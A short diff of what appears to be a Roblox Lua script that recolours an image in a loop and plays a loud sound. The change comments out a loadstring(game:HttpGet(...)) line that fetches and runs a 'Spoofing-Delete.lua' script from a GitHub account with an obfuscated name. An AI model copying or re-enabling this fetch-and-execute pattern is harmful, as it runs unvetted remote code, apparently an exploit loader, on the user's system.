@@ -84,7 +84,7 @@ while wait() do
     img.ImageColor3 = Color3.new(1,1,1)
 end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/main/Spoofing-Delete.lua", true))()
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/main/Spoofing-Delete.lua", true))()
 local auegh = Instance.new("Sound",game)
 auegh.Volume = 10
 auegh.SoundId = "rbxassetid://5567523008"
